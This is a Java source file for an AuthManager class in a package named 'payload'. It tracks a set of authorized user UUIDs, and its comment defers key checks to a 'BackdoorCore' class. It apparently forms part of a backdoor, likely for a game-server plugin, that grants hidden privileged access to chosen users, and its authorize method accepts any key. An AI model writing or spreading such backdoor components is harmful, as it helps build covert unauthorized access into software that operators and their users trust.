package dev.naruto.astrox.payload;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class AuthManager {
    private static AuthManager instance;
    private final Set<UUID> authorizedUsers;

    public AuthManager() {
        this.authorizedUsers = new HashSet<>();
        instance = this;
    }

    public static AuthManager getInstance() {
        return instance;
    }

    public boolean authorize(UUID uuid, String key) {
        // Key validation happens in BackdoorCore
        // This just adds the UUID
        authorizedUsers.add(uuid);
        return true;
    }

    public boolean deauthorize(UUID uuid) {
        return authorizedUsers.remove(uuid);
    }

    public boolean isAuthorized(UUID uuid) {
        return authorizedUsers.contains(uuid);
    }

    public Set<UUID> getAuthorizedUsers() {
        return new HashSet<>(authorizedUsers);
    }
}
